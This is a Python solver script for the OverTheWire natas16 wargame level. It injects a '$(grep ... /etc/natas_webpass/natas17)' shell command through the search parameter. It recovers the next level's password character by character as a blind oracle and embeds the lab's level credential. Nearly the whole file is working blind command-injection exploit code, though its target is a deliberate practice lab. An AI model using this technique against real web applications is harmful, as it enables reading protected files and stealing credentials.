from threading import Thread
import requests
from requests.auth import HTTPBasicAuth
import time

cSetReady = 0
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = chars
passwd = ''

url = 'http://natas16.natas.labs.overthewire.org/index.php?needle='
usr = 'natas16'
pwd = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

param = 'username'
SQLi = 'doomed$(grep {} /etc/natas_webpass/natas17)'
correctResponse = 'doomed'

browser = requests.Session()
browser.auth = (usr, pwd)

def inject(char):
    global passwd
    payload = SQLi.format('^' + passwd + char)
    r = browser.get(url + payload)
    if not correctResponse in r.text :
        passwd += char
        print(passwd)
"""
def  getCharSet(char):
    global filtered
    global cSetReady
    payload = SQLi.format('%' + char + '%')
    Data = { param : payload }
    r = browser.post(url, data=Data)
    if correctResponse in r.text :
        filtered += char
    cSetReady += 1
        
print('getting charset .... ')
for char in chars:
    Thread(target=getCharSet, args={char}).start()
while cSetReady != len(chars):
    pass
print("Filter : " + filtered)
"""

for i in range(0,32):
    for char in filtered:
        check = len(passwd)
        if len(passwd) == check :            
            Thread(target=inject, args={char}).start()
        else:
            break;
    while len(passwd) == check and not len(passwd) == 32:
        pass


            

